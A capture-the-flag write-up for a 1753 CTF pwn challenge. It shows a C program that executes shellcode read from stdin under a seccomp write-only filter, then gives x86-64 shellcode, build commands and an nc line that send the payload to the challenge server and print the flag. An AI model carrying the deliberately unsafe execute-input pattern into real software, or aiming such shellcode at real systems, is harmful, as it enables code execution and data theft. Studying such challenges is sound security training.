# ✍️ Write Only (Score: 170 / Solves: 33)
The flag is there. But that doesn't mean you'll be able to see it.

nc 147.78.1.47 40183

https://dl.1753ctf.com/write-only?s=jRBXD9EC


## Solution

We received a C file, and were tasked with exploiting it.

```c
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>

#include <errno.h>
#include <linux/audit.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <linux/unistd.h>
#include <stddef.h>
#include <stdio.h>
#include <sys/prctl.h>
#include <unistd.h>

#include <stdbool.h>

bool install_filter()
{
	struct sock_filter filter[] = {
		BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(struct seccomp_data, arch))),
		BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, AUDIT_ARCH_X86_64, 1, 0),
		BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL_PROCESS),

		BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(struct seccomp_data, nr))),

		BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_write, 0, 1),
		BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
		BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_exit, 0, 1),
		BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
		BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_exit_group, 0, 1),
		BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
		BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL_PROCESS),
	};
	struct sock_fprog prog = {
		.len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),
		.filter = filter,
	};
	if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0))
	{
		perror("prctl(NO_NEW_PRIVS)");
		return 1;
	}
	if (prctl(PR_SET_SECCOMP, 2, &prog))
	{
		perror("prctl(PR_SET_SECCOMP)");
		return 1;
	}
	return 0;
}

int main()
{
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);

	const int FLAG_SIZE = 0x40;
	char flag[FLAG_SIZE];
	char *flag_mem = (char *)mmap(NULL, FLAG_SIZE, PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	FILE *flag_file = fopen("flag", "r");
	fread(flag_mem, 1, FLAG_SIZE, flag_file);
	fclose(flag_file);

	const int CODE_SIZE = 0x200;
	char *code_mem = (char *)mmap(NULL, CODE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	read(STDIN_FILENO, code_mem, CODE_SIZE);
	mprotect(code_mem, CODE_SIZE, PROT_READ | PROT_EXEC);

	install_filter();

	asm(
		"mov rax, %0;" // flag address in rax
		"jmp %1;"	   // jump into recdeived code
		:			   // no output
		: "r"(flag_mem), "r"(code_mem));
}
```

The key vulnerability lies in the dynamic execution of untrusted code read from stdin. The program executes this code with the flag's memory address available, allowing a carefully crafted payload to read the flag and output it using the allowed write system call.

To exploit this program and capture the flag:

1. Craft a Payload: You need to write assembly code (or compile C code to assembly that fits the constraints) that:
	* Uses the write system call to output the flag to stdout.
	* Operates under the assumption that the starting address of the flag is provided in the RAX register (as the program's final instructions before executing the untrusted code suggest).
	* Adheres to the x86_64 calling conventions, specifically for system calls (e.g., system call number in RAX, arguments in RDI, RSI, RDX, etc., for the write syscall).

2. Bypass the seccomp Filter: Ensure your payload only uses the allowed system calls (write, exit, exit_group). Since the program explicitly kills any process that attempts to use a system call other than these, your payload must avoid making any other system calls.

3. Deliver the Payload: Once your payload is ready, you just need to provide it to the program's stdin when executed. This could be done by echoing the payload and piping it into the program, or by providing it through an input file redirected to the program.

```assembly
; Move the flag address from RAX to RSI (since RAX will be overwritten for syscall number)
mov rsi, rax

; Write syscall number (1) to RAX
mov rax, 1

; Set file descriptor to stdout (1) in RDI
mov rdi, 1

; Set number of bytes to write in RDX
mov rdx, 0x40

; Invoke the syscall
syscall

; Exit syscall
mov rax, 60  ; syscall number for exit
xor rdi, rdi ; status code 0
syscall
```

```sh
nasm -f elf64 payload.asm -o payload.o
ld -o payload payload.o
objcopy -O binary payload payload.bin
nc 147.78.1.47 40183 < payload.bin
```

1753c{yes_its_write_only_but_you_can_read_it_too}
